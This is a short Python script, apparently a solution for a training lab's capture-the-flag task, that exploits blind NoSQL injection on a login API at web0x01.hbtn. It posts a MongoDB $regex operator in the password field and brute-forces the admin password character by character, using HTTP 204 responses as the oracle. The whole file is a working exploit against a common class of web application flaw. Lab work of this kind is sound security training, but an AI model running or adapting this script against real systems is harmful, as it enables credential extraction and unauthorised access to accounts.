import requests

# The endpoint you found is vulnerable to NoSQL logic
url = "http://web0x01.hbtn/api/a3/nosql_injection/login"
alphabet = "0123456789abcdef"
flag = ""

print("Starting extraction... (Each 'Found' is a character of your flag)")

while True:
    found_char = False
    for char in alphabet:
        # We use regex to check the start of the password string
        payload = {"username": "admin", "password": {"$regex": "^" + flag + char}}
        r = requests.post(url, json=payload)
        
        # In this lab, 204 means the regex matched (True)
        if r.status_code == 204:
            flag += char
            print(f"Flag so far: {flag}")
            found_char = True
            break
            
    if not found_char:
        break

print(f"\nFinal Flag for 6-flag.txt: {flag}")
